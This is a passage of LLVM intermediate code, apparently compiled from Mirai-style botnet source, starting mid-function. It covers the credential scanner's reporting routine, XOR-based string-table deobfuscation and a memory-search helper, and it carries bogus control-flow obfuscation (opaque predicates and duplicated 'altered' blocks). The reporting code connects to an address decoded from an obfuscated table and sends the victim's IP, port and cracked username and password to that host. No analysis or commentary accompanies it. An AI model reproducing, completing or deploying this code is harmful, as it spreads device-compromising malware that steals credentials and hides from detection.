  %96 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %97 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %96, i32 0, i32 0
  %98 = load i8*, i8** %97, align 8
  %99 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %100 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %99, i32 0, i32 4
  %101 = load i8, i8* %100, align 4
  %102 = zext i8 %101 to i64
  %103 = call i64 @send(i32 %95, i8* %98, i64 %102, i32 16384)
  %104 = load i32, i32* %9, align 4
  %105 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %106 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %105, i32 0, i32 5
  %107 = call i64 @send(i32 %104, i8* %106, i64 1, i32 16384)
  %108 = load i32, i32* %9, align 4
  %109 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %110 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %109, i32 0, i32 1
  %111 = load i8*, i8** %110, align 8
  %112 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %113 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %112, i32 0, i32 5
  %114 = load i8, i8* %113, align 1
  %115 = zext i8 %114 to i64
  %116 = call i64 @send(i32 %108, i8* %111, i64 %115, i32 16384)
  %117 = load i32, i32* %9, align 4
  %118 = call i32 @close(i32 %117)
  %119 = load i32, i32* @x.75
  %120 = load i32, i32* @y.76
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %127

; <label>:127:                                    ; preds = %originalBBpart28, %18
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %19
  %128 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %128, i32* %9, align 4
  %129 = icmp eq i32 %128, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  call void @table_unlock_val(i8 zeroext 2)
  %130 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %130, align 4
  %131 = call i32 @inet_addr(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.33, i32 0, i32 0)) #6
  %132 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %133 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %132, i32 0, i32 0
  store i32 %131, i32* %133, align 4
  %134 = call i8* @table_retrieve_val(i32 2, i32* null)
  %135 = bitcast i8* %134 to i16*
  %136 = load i16, i16* %135, align 2
  %137 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %136, i16* %137, align 2
  call void @table_lock_val(i8 zeroext 2)
  %138 = load i32, i32* %9, align 4
  %139 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %140 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %140, %struct.sockaddr** %139, align 8
  %141 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %142 = load %struct.sockaddr*, %struct.sockaddr** %141, align 8
  %143 = call i32 @connect(i32 %138, %struct.sockaddr* %142, i32 16)
  %144 = icmp eq i32 %143, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  store i8 0, i8* %11, align 1
  %145 = load i32, i32* %9, align 4
  %146 = call i64 @send(i32 %145, i8* %11, i64 1, i32 16384)
  %147 = load i32, i32* %9, align 4
  %148 = bitcast i32* %4 to i8*
  %149 = call i64 @send(i32 %147, i8* %148, i64 4, i32 16384)
  %150 = load i32, i32* %9, align 4
  %151 = bitcast i16* %5 to i8*
  %152 = call i64 @send(i32 %150, i8* %151, i64 2, i32 16384)
  %153 = load i32, i32* %9, align 4
  %154 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %155 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %154, i32 0, i32 4
  %156 = call i64 @send(i32 %153, i8* %155, i64 1, i32 16384)
  %157 = load i32, i32* %9, align 4
  %158 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %159 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %158, i32 0, i32 0
  %160 = load i8*, i8** %159, align 8
  %161 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %162 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %161, i32 0, i32 4
  %163 = load i8, i8* %162, align 4
  %164 = zext i8 %163 to i64
  %165 = call i64 @send(i32 %157, i8* %160, i64 %164, i32 16384)
  %166 = load i32, i32* %9, align 4
  %167 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %168 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %167, i32 0, i32 5
  %169 = call i64 @send(i32 %166, i8* %168, i64 1, i32 16384)
  %170 = load i32, i32* %9, align 4
  %171 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %172 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %171, i32 0, i32 1
  %173 = load i8*, i8** %172, align 8
  %174 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %175 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %174, i32 0, i32 5
  %176 = load i8, i8* %175, align 1
  %177 = zext i8 %176 to i64
  %178 = call i64 @send(i32 %170, i8* %173, i64 %177, i32 16384)
  %179 = load i32, i32* %9, align 4
  %180 = call i32 @close(i32 %179)
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = load i32, i32* @x.77
  %5 = load i32, i32* @y.78
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca %struct.scanner_connection*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %12, align 8
  store i8* %1, i8** %13, align 8
  store i32 %2, i32* %14, align 4
  %16 = load %struct.scanner_connection*, %struct.scanner_connection** %12, align 8
  %17 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %16, i32 0, i32 7
  %18 = getelementptr inbounds [256 x i8], [256 x i8]* %17, i32 0, i32 0
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %12, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 6
  %21 = load i32, i32* %20, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds i8, i8* %18, i64 %22
  store i8* %23, i8** %15, align 8
  %24 = load i8*, i8** %13, align 8
  %25 = load i32, i32* %14, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8*, i8** %15, align 8
  %29 = icmp ult i8* %27, %28
  %30 = zext i1 %29 to i32
  %31 = trunc i32 %30 to i8
  %32 = load i32, i32* @x.77
  %33 = load i32, i32* @y.78
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8 %31

originalBBalteredBB:                              ; preds = %originalBB, %3
  %40 = alloca %struct.scanner_connection*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %40, align 8
  store i8* %1, i8** %41, align 8
  store i32 %2, i32* %42, align 4
  %44 = load %struct.scanner_connection*, %struct.scanner_connection** %40, align 8
  %45 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %44, i32 0, i32 7
  %46 = getelementptr inbounds [256 x i8], [256 x i8]* %45, i32 0, i32 0
  %47 = load %struct.scanner_connection*, %struct.scanner_connection** %40, align 8
  %48 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %47, i32 0, i32 6
  %49 = load i32, i32* %48, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %46, i64 %50
  store i8* %51, i8** %43, align 8
  %52 = load i8*, i8** %41, align 8
  %53 = load i32, i32* %42, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8*, i8** %43, align 8
  %57 = icmp ult i8* %55, %56
  %58 = zext i1 %57 to i32
  %59 = trunc i32 %58 to i8
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i64 @recv(i32, i8*, i64, i32) #3

declare void @util_zero(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 %13) #6
  store i8* %14, i8** %6, align 8
  %15 = load i8*, i8** %6, align 8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32*, i32** %4, align 8
  %18 = load i32, i32* %17, align 4
  %19 = add nsw i32 %18, 1
  call void @util_memcpy(i8* %15, i8* %16, i32 %19)
  store i32 0, i32* %5, align 4
  br label %20

; <label>:20:                                     ; preds = %74, %2
  %21 = load i32, i32* %5, align 4
  %22 = load i32*, i32** %4, align 8
  %23 = load i32, i32* %22, align 4
  %24 = icmp slt i32 %21, %23
  br i1 %24, label %25, label %77

; <label>:25:                                     ; preds = %20
  %26 = load i32, i32* @x.79
  %27 = load i32, i32* @y.80
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = xor i32 %39, 222
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %37, align 1
  %42 = load i8*, i8** %6, align 8
  %43 = load i32, i32* %5, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = xor i32 %47, 222
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %45, align 1
  %50 = load i8*, i8** %6, align 8
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = xor i32 %55, 251
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %53, align 1
  %58 = load i8*, i8** %6, align 8
  %59 = load i32, i32* %5, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = sext i8 %62 to i32
  %64 = xor i32 %63, 175
  %65 = trunc i32 %64 to i8
  store i8 %65, i8* %61, align 1
  %66 = load i32, i32* @x.79
  %67 = load i32, i32* @y.80
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %74

; <label>:74:                                     ; preds = %originalBBpart2
  %75 = load i32, i32* %5, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %5, align 4
  br label %20

; <label>:77:                                     ; preds = %20
  %78 = load i32, i32* @x.79
  %79 = load i32, i32* @y.80
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %77
  %86 = load i8*, i8** %6, align 8
  %87 = load i32, i32* @x.79
  %88 = load i32, i32* @y.80
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  ret i8* %86

originalBBalteredBB:                              ; preds = %originalBB, %25
  %95 = load i8*, i8** %6, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %95, i64 %97
  %99 = load i8, i8* %98, align 1
  %100 = sext i8 %99 to i32
  %_ = sub i32 %100, 222
  %gen = mul i32 %_, 222
  %101 = xor i32 %100, 222
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %98, align 1
  %103 = load i8*, i8** %6, align 8
  %104 = load i32, i32* %5, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %_1 = sub i32 0, %108
  %gen2 = add i32 %_1, 222
  %_3 = sub i32 0, %108
  %gen4 = add i32 %_3, 222
  %_5 = sub i32 %108, 222
  %gen6 = mul i32 %_5, 222
  %_7 = sub i32 %108, 222
  %gen8 = mul i32 %_7, 222
  %109 = xor i32 %108, 222
  %110 = trunc i32 %109 to i8
  store i8 %110, i8* %106, align 1
  %111 = load i8*, i8** %6, align 8
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8, i8* %111, i64 %113
  %115 = load i8, i8* %114, align 1
  %116 = sext i8 %115 to i32
  %_9 = shl i32 %116, 251
  %_10 = shl i32 %116, 251
  %_11 = sub i32 %116, 251
  %gen12 = mul i32 %_11, 251
  %117 = xor i32 %116, 251
  %118 = trunc i32 %117 to i8
  store i8 %118, i8* %114, align 1
  %119 = load i8*, i8** %6, align 8
  %120 = load i32, i32* %5, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  %123 = load i8, i8* %122, align 1
  %124 = sext i8 %123 to i32
  %_13 = sub i32 %124, 175
  %gen14 = mul i32 %_13, 175
  %_15 = sub i32 %124, 175
  %gen16 = mul i32 %_15, 175
  %125 = xor i32 %124, 175
  %126 = trunc i32 %125 to i8
  store i8 %126, i8* %122, align 1
  br label %originalBB

originalBB17alteredBB:                            ; preds = %originalBB17, %77
  %127 = load i8*, i8** %6, align 8
  br label %originalBB17
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

; <label>:34:                                     ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

; <label>:83:                                     ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27

; <label>:86:                                     ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.89
  %6 = load i32, i32* @y.90
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %14, align 8
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  store i32 0, i32* %18, align 4
  store i32 0, i32* %19, align 4
  %20 = load i32, i32* %17, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = load i32, i32* @x.89
  %24 = load i32, i32* @y.90
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %32

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 -1, i32* %13, align 4
  br label %82

; <label>:32:                                     ; preds = %originalBBpart2
  store i32 0, i32* %18, align 4
  br label %33

; <label>:33:                                     ; preds = %62, %32
  %34 = load i32, i32* %18, align 4
  %35 = load i32, i32* %15, align 4
  %36 = icmp slt i32 %34, %35
  br i1 %36, label %37, label %65

; <label>:37:                                     ; preds = %33
  %38 = load i8*, i8** %14, align 8
  %39 = load i32, i32* %18, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i8, i8* %41, align 1
  %43 = sext i8 %42 to i32
  %44 = load i8*, i8** %16, align 8
  %45 = load i32, i32* %19, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %43, %49
  br i1 %50, label %51, label %60

; <label>:51:                                     ; preds = %37
  %52 = load i32, i32* %19, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %19, align 4
  %54 = load i32, i32* %17, align 4
  %55 = icmp eq i32 %53, %54
  br i1 %55, label %56, label %59

; <label>:56:                                     ; preds = %51
  %57 = load i32, i32* %18, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %13, align 4
  br label %82

; <label>:59:                                     ; preds = %51
  br label %61

; <label>:60:                                     ; preds = %37
  store i32 0, i32* %19, align 4
  br label %61

; <label>:61:                                     ; preds = %60, %59
  br label %62

; <label>:62:                                     ; preds = %61
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %18, align 4
  br label %33

; <label>:65:                                     ; preds = %33
  %66 = load i32, i32* @x.89
  %67 = load i32, i32* @y.90
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  store i32 -1, i32* %13, align 4
  %74 = load i32, i32* @x.89
  %75 = load i32, i32* @y.90
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %82

; <label>:82:                                     ; preds = %originalBBpart24, %56, %31
  %83 = load i32, i32* %13, align 4
  ret i32 %83

originalBBalteredBB:                              ; preds = %originalBB, %4
  %84 = alloca i32, align 4
  %85 = alloca i8*, align 8
  %86 = alloca i32, align 4
  %87 = alloca i8*, align 8
  %88 = alloca i32, align 4
  %89 = alloca i32, align 4
  %90 = alloca i32, align 4
  store i8* %0, i8** %85, align 8
  store i32 %1, i32* %86, align 4
  store i8* %2, i8** %87, align 8
  store i32 %3, i32* %88, align 4
  store i32 0, i32* %89, align 4
  store i32 0, i32* %90, align 4
  %91 = load i32, i32* %88, align 4
  %92 = load i32, i32* %86, align 4
  %93 = icmp sgt i32 %91, %92
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  store i32 -1, i32* %13, align 4
  br label %originalBB1
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
